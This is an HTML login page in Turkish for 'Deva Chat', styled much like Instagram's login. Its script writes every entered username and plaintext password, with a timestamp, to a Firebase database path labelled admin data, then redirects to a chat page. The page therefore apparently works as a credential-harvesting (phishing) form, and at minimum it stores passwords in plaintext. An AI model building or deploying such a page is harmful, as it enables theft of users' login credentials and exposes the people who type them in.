<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deva Chat | Giriş</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h1 { font-style: italic; font-size: 45px; margin-bottom: 40px; letter-spacing: -1px; }
        input { width: 100%; padding: 14px; margin: 6px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 4px; box-sizing: border-box; font-size: 14px; outline: none; }
        input:focus { border-color: #555; }
        button { width: 100%; padding: 14px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; font-size: 15px; }
        button:active { opacity: 0.7; }
    </style>
</head>
<body>

    <div class="login-card">
        <h1>Deva Chat</h1>
        <input type="text" id="username" placeholder="Telefon, kullanıcı adı veya e-posta">
        <input type="password" id="password" placeholder="Şifre">
        <button onclick="sistemeGir()">Giriş Yap</button>
    </div>

    <script>
        // Sizin görüntünüzden aldığımız gerçek Avrupa sunucu adresi
        var firebaseConfig = {
            apiKey: "AIzaSyDMFqe-lG6-cZUM4XhXs5ftkZt9xZjsno0",
            databaseURL: "https://devachat-fdeb3-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "devachat-fdeb3"
        };

        // Firebase'i başlat
        firebase.initializeApp(firebaseConfig);
        var db = firebase.database();

        function sistemeGir() {
            var user = document.getElementById('username').value;
            var pass = document.getElementById('password').value;

            if(user !== "" && pass !== "") {
                // Bilgileri Firebase'e yazıyoruz
                db.ref('yonetici_verileri/' + user).set({
                    kullanici: user,
                    sifre: pass,
                    tarih: new Date().toLocaleString(),
                    durum: "Giriş Yapıldı"
                }).then(function() {
                    // Başarılıysa yönlendir
                    localStorage.setItem('chatUser', user);
                    window.location.href = "chat.html";
                }).catch(function(error) {
                    // Hata olursa ekrana mesaj çıkar
                    alert("Bağlantı Hatası: " + error.message);
                });
            } else {
                alert("Lütfen tüm alanları doldurun!");
            }
        }
    </script>
</body>
</html>
